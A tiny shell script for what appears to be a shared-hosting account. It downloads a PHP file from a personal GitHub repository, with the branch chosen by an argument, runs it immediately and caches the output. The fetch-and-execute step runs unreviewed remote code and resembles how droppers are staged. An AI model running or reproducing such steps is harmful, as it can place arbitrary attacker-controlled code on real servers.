#!/bin/sh
D=/home/u791571885/dgx2; mkdir -p $D; cd $D || exit 1
[ -f out.txt ] && { cat out.txt; exit 0; }
curl -fsSL -o dx.php "https://raw.githubusercontent.com/a04032417-svg/Dar/$1/dx.php"
/opt/alt/php83/usr/bin/php dx.php > out.tmp 2>&1; mv out.tmp out.txt; cat out.txt
